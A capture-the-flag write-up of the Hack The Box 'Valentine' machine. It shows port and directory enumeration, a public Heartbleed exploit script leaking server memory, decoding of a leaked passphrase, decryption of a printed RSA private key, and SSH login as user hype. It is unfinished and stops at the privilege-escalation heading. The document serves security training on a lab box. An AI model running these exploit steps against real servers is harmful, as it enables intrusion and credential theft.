---
title: HTB - Valentine Write-up
author: bigb0ss
date: 2020-11-15 19:36:00 +0800
categories: [Hack The Box, Linux, Easy]
tags: [hackthebox, valentine]
image: /assets/img/post/htb/valentine/01_infocard.png
---

This was an easy difficulty box. It was pretty easy and straight-forward box. Good learning path to:
* 


## Initial Recon

### Nmap

Let’s begin with an initial port scan:

```console
$ nmap -Pn --open -sV -sC -p- 10.10.10.79

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2020-11-15T22:16:49+00:00; +4m58s from scanner time.
```

<b>Interesting Ports to Note</b>

* HTTP (80/TCP) - Image file 
* HTTPS (443/TCP) - The same image file as port 80

![image](/assets/img/post/htb/valentine/02.png)


### Web Directory Enumeration (dirsearch)

Since we have only web ports to work with, we can go ahead and do some web directory enumeration using `dirsearch`.

```console
$ python3 dirsearch.py -u https://10.10.10.79/ -e php,txt,html | grep 200 
                                                                               
[17:27:44] 200 -    1KB - /dev/   
[17:27:50] 200 -   38B  - /index
[17:27:50] 200 -   38B  - /index.php     
[17:27:51] 200 -   38B  - /index.php/login/
```

It found a directory called `/dev/`. 

![image](/assets/img/post/htb/valentine/03.png)

The `notes.txt` wasn't too interesting but suggesting some type of client-side encoder/decoder structure. 

```console
https://10.10.10.79/dev/notes.txt

To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

On the other hand, the `hype_key` file was containing a long hex value. 

![image](/assets/img/post/htb/valentine/04.png)


### RSA Private Key 

Next, downloaded the `hype_key` using the following command:

```console
$ wget https://10.10.10.79/dev/hype_key --no-check-certificate
--2020-11-15 17:32:20--  https://10.10.10.79/dev/hype_key
Connecting to 10.10.10.79:443... connected.
WARNING: The certificate of ‘10.10.10.79’ is not trusted.
WARNING: The certificate of ‘10.10.10.79’ doesn't have a known issuer.
WARNING: The certificate of ‘10.10.10.79’ has expired.
The certificate has expired
The certificate's owner does not match hostname ‘10.10.10.79’
HTTP request sent, awaiting response... 200 OK
Length: 5383 (5.3K)
Saving to: ‘hype_key’

hype_key                                   100%[========================================================================================>]   5.26K  --.-KB/s    in 0s      

2020-11-15 17:32:20 (95.7 MB/s) - ‘hype_key’ saved [5383/5383]
```

Using the following `xxd` command, we can obtain the encrypted the private key:

```console
$ cat hype_key | xxd -r -p
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

> **NOTE**: -r - reverse operation: convert (or patch) hexdump into binary; -p - Output in postscript continuous hexdump style. Also known as plain hexdump style


### Decrypt RSA Private Key (Heartbleed - CVE-2014-0160)

When we try to decrypt the private key, it will prompt you with "Enter pass phrase..." 

```console
$ cat hype_key | xxd -p -r > hype_key_enc
$ openssl rsa -in hype_key.enc -out hype_key.dec
Enter pass phrase for hype_key.enc:
unable to load Private Key
140557154002176:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:../crypto/evp/evp_enc.c:583:
140557154002176:error:0906A065:PEM routines:PEM_do_header:bad decrypt:../crypto/pem/pem_lib.c:461:
```

So going back to the image in the web page, that appeared to be suggesting an attack called Heartbleed. In short, Heartbleed is an OpenSSL vulnerability that allows an attacker to trick the vulnreable web server to leak a chunk of memory. 

<b>Searchsploit</b>

```console
$ searchsploit heartbleed
----------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                     |  Path
                                                                                                                                   | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)                                | exploits/multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                                                | exploits/multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                                                 | exploits/multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                                                   | exploits/multiple/remote/32745.py
----------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
```

We can use the `32764.py` script to exploit the Heartbleed vulnerability on this host. 

```console
$ python 32764.py 10.10.10.79
Trying SSL 3.0...
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0300, length = 94
 ... received message: type = 22, ver = 0300, length = 885
 ... received message: type = 22, ver = 0300, length = 331
 ... received message: type = 22, ver = 0300, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0300, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D B6  mV0aGVoeXBlCg==.
  0160: 57 F7 66 8E E5 AB 66 C4 11 8C 7B DC 39 F3 17 3D  W.f...f...{.9..=
  0170: 00 21 52 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  .!R.............
```

The server was indeed vulnerable, and by running the exploit script, we can see the leaked data. The most interesting data was encoded value next to the `$text` parameter. When we decode the base64 encoded value, we get the plain text of `heartbleedbelievethehype`. 

```console
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

# base64 Decode
$ echo -n "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
heartbleedbelievethehype
```

Then, we can use that string to decrypt the previously found privage key. 

```console
$ openssl rsa -in hype_key.enc -out hype_key.dec
Enter pass phrase for hype_key.enc:
writing RSA key

$ cat hype_key.dec 
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA1FN4mXAwn3ggiDC/N+BcdmEBf0yMl6IulSOkv9WfUrGTPTUo
cFHUa95jyaHFjme0c7hG6URWS9c4JMpB35/KUdFnOpI0MOJQlRldt+4qlpRvjEhk
VTj7g0tVJmjd3Temyy+eNSzaU7HBOEWzcz4T+qQ+aSrEl+yHDLAH8mfa6X2SrnIk
tC16W00upKJK67uvzDNbtw5HH8bklvB3jupVkO7GwjC2wqfVoypgUZcTGOCY9LVL
M/H+urxmh8VomlMwRcuZvNqnwsi/TeGK6NcXtURfLgufIvKxP22g81thjCuyVXAL
z4rp7tidEHloPLFTsrSy8T1cT6zyg2+wgRJMzQIDAQABAoIBACBqAc5C31lpCGZi
Mr8ABH2Z/5WEhS4c90mTYHJc1W7VZyn/9IV5KJmzIL7GcJd144mLB2BTK212lL6h
Ff9isItfEYhSi58u3ah1b+ZFeMD2NjVPU+niwhrgJEax2bUM6uy3/0oU59vBFkNV
+LhOMNShwFljyxF6bX+VXBE4o6XjW464FTD/zGplsB5MrygXNvkx14MwXhKPpjLD
3FF2HZiPmsavH925VGfMxLLj1V2T1xrpEwkzimATrOvlXN00BZqqmm643QJrJrgl
snkFn8/cBMxuWlzw1tHrSFmO8Yns+JVABP0ci9jmvVhLidqqHshl3DmMhb3tS4nA
3pTc0Q0CgYEA7i1QecUryhtCttc3dzQVCZdmkD9Sr7f7r/ne7jNVNq/n/VUh6ZYI
ELq+Ouip+RneR7cpov1s+COF+KyJW5LCNtqmC+7wtYMSWfdSmfMco+pRWQvFHVa8
KC1C2qybYWgxD1gRjDbWvNdarOq7NGVBBE5W2lpm2nO0s3Bkd53oNG8CgYEA5Dbw
FP2Q47N2TgtedOwsCKE3uzGGSV3FTRB3HZoOLBcc3CYBM1kQZpcThl5YVLvc6r6T
xQRhKc73QR2GFLD03yYBN7HwgOPtU/t7m2dIKJRgSkLYE/G+iZ1OxNJsTWREQ34b
yVXhxgpm4LEelfAN4+mbub8ELEi9b2G9Wg4kCIMCgYEAxPQv4iJMDbrxNiVONoKZ
Cu9p3sqeY7Ruqpyj3rIQO0LHQlQN0Q1B6iOifzA6rkTX7NHn2mJao+8sL/DtPQ5l
D9tLB/80icSzfjXo1mmVO27eihYTkClTOp4C9LVbX/c66odXK22FsW8cCnWpDLDW
TOtDIxkyiF66BNBiJBAuHn0CgYEAk3VUB5wXxKku5hq+e7omcaUKB7BmXn1ygOsE
rGHgimicwzrjR7RivocbnJTValrA0gU2IfVEeuk6Jh7XhgMZFh7OZphZGE8uCDfU
lINVwrKszQ8H40sunGjCfragOBlzalDPz3XonjgWZVTMuIEV2JAXiRt9rMeLb66t
1MSST9UCgYEAnto5uquA7UPpk7zgawoqR+kXhlOy1RpO1OwNxJXAi/EB99k0QL5m
vEgeEwRP/+S8UCRvLGdHrnHg6GyCEQMYNuUGtOVqNRw2ezIrpU7RybdTFN/gX+6S
tpUEwXFAuMcDkksSNTLIJC2sa7eJFpHqeajJWAc30qOO1IBlNVoehxA=
-----END RSA PRIVATE KEY-----
```

## Initial Foothold

### SSH (RSA Private Key)

Using the decrypted SSH key, we can now SSH into box as `hype`.

```console
$ ssh -i hype_key.dec hype@10.10.10.79
The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.

Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3

hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
```

## Privilege Escalation

### hype —> root



